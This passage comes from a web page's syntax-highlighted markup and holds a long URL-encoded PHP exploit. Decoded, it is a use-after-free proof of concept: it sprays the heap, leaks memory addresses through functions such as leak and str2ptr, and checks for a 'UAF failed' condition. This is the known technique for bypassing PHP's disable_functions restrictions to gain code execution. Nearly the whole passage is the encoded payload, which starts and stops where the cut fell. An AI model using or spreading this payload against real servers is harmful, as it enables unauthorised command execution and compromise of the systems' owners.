class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">68</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">66</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">20</span>%<span class="hljs-number">21</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">67</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">75</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">76</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">65</span>%<span class="hljs-number">77</span>%<span class="hljs-number">20</span>%<span class="hljs-number">56</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>e%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">76</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>e%<span class="hljs-number">2</span>d%<span class="hljs-number">3</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">50</span>%<span class="hljs-number">48</span>%<span class="hljs-number">50</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">4</span>f%<span class="hljs-number">53</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">27</span>%<span class="hljs-number">57</span>%<span class="hljs-number">49</span>%<span class="hljs-number">4</span>e%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">64</span>%<span class="hljs-number">69</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>%<span class="hljs-number">54</span>%<span class="hljs-number">68</span>%<span class="hljs-number">69</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">50</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">43</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>a%<span class="hljs-number">6</span>e%<span class="hljs-number">69</span>%<span class="hljs-number">78</span>%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">79</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">6</span>c%<span class="hljs-number">79</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">63</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">67</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">5</span>b%<span class="hljs-number">5</span>d%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">63</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">67</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">73</span>%<span class="hljs-number">5</span>b%<span class="hljs-number">5</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">75</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">67</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>%<span class="hljs-number">78</span>%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>b%<span class="hljs-number">31</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">5</span>b%<span class="hljs-number">27</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">73</span>%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">5</span>b%<span class="hljs-number">30</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">65</span>%<span class="hljs-number">77</span>%<span class="hljs-number">20</span>%<span class="hljs-number">48</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">3</span>e%<span class="hljs-number">62</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">78</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">7</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">64</span>%<span class="hljs-number">69</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">55</span>%<span class="hljs-number">41</span>%<span class="hljs-number">46</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">61</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">64</span>%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">68</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">64</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">32</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">68</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">70</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">32</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">35</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span 